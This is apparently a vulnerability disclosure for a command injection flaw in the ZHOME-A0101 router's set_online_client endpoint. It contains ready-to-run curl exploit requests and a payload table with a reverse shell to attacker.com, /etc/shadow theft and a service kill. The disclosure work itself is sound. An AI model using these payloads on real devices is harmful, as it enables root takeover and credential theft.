# Command Injection Vulnerability in ZHOME ZH-A0101 set_online_client via `mac`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRQos/set_online_client`
- **Affected Parameter:** `mac`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                                   |
| ------------------- | -------------------------------------------------------- |
| File                | `usr/lib/lua/luci/controller/api/zrQos.lua`              |
| Function            | `set_online_client()`                                    |
| Code Location       | line 306-379                                             |
| Injection Location  | line 379                                                 |
| Endpoint            | `POST /api/ZRQos/set_online_client`                      |
| Injection Parameter | `mac`                                                    |
| Injection Method    | `;` command separator executed through `LuciUtil.exec()` |
| Trigger Condition   | `internet_enable=0` or `internet_enable != 1`            |
| Authentication      | HTTP Basic Auth (`root`)                                 |

## Vulnerable Code
<img width="1661" height="1233" alt="6762bea33854b2b22923beea4f1d278d" src="https://github.com/user-attachments/assets/e66312c5-8f69-4161-85f0-ee36c8d62549" />
<img width="2220" height="1170" alt="fc47ee072cd1caed5e85c58287b415b5" src="https://github.com/user-attachments/assets/22f75144-3761-40ee-81aa-9feb947f7cef" />


```lua
-- zrQos.lua line 306-379
function set_online_client()
    local mac = luci.http.formvalue("mac")
    local ip = luci.http.formvalue("ip")
    local internet_enable = tonumber(luci.http.formvalue("internet_enable"))
    -- ...

    if cur_section == nil then
        if internet_enable == 1 then
            -- ip injection path, covered by VULN-29
        else
            LuciUtil.exec("iptables -t mangle -A limit_chain -m mac --mac-source " ..
                mac .. " -j DROP > /dev/null 2>&1")
        end
    end
end
```

The `mac` parameter is directly inserted into an `iptables` command. If `internet_enable` is not `1`, the code enters the `else` branch and executes the command through `LuciUtil.exec()`. Because the command is built as a raw shell string, a semicolon in `mac` can append arbitrary commands.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |
 |-- Step 2: Log in and obtain sysauth cookie plus stok.
 |
 |-- Step 3: Send an authenticated request.
 |           URL:
 |           /api/ZRQos/set_online_client
 |
 |           Required parameters:
 |           mac=<PAYLOAD>
 |           ip=192.168.18.100
 |           hostname=test
 |           internet_enable=0
 |           down_limit=0
 |           up_limit=0
 |
 |-- Step 4: Inject through the mac parameter.
 |           Normal value:
 |           mac=AA:BB:CC:DD:EE:FF
 |
 |           Normal command:
 |           iptables -t mangle -A limit_chain -m mac --mac-source AA:BB:CC:DD:EE:FF -j DROP
 |
 |           Injected value:
 |           mac=AA:BB:CC:DD:EE:FF;id>/tmp/vuln30.txt
 |
 |           Final command:
 |           iptables -t mangle -A limit_chain -m mac --mac-source AA:BB:CC:DD:EE:FF;id>/tmp/vuln30.txt -j DROP
 |
 `-- Step 5: /bin/sh executes the injected command.
             cat /tmp/vuln30.txt returns uid=0(root) gid=0(root)
```

## Trigger Request

### Execute `id`

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRQos/set_online_client" \
  -d "mac=FF:00:11:22:33:44%3bid>/tmp/vuln30.txt&ip=192.168.18.100&hostname=test&internet_enable=0&down_limit=0&up_limit=0"
```

### Create a Marker File

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRQos/set_online_client" \
  -d "mac=FF:00:11:22:33:44%3btouch%20/tmp/vuln30.txt&ip=192.168.18.100&hostname=test&internet_enable=0&down_limit=0&up_limit=0"
```

When using raw `-d`, encode `;` as `%3b` and spaces as `%20`. When using `--data-urlencode`, curl performs the encoding automatically.

## Verification

```bash
ssh -p 1022 root@192.168.18.1 "ls -la /tmp/vuln30.txt && cat /tmp/vuln30.txt"
```
<img width="1800" height="252" alt="8b90e383e4bb7bdbf81700e0b8ce7ed2" src="https://github.com/user-attachments/assets/920cd8c7-202f-4975-bf79-9726325da643" />

## Exploitation Scenarios

| Scenario               | Payload                                             | Description                 |
| ---------------------- | --------------------------------------------------- | --------------------------- |
| Create file            | `AA:BB:CC:DD:EE:FF;touch /tmp/test`                 | Verify command execution    |
| Reverse shell          | `AA:BB:CC:DD:EE:FF;nc attacker.com 4444 -e /bin/sh` | Requires `nc` on the device |
| Information collection | `AA:BB:CC:DD:EE:FF;cat /etc/shadow>/tmp/s.txt`      | Steal sensitive information |
| Kill process           | `AA:BB:CC:DD:EE:FF;killall uhttpd`                  | Stop the web service        |

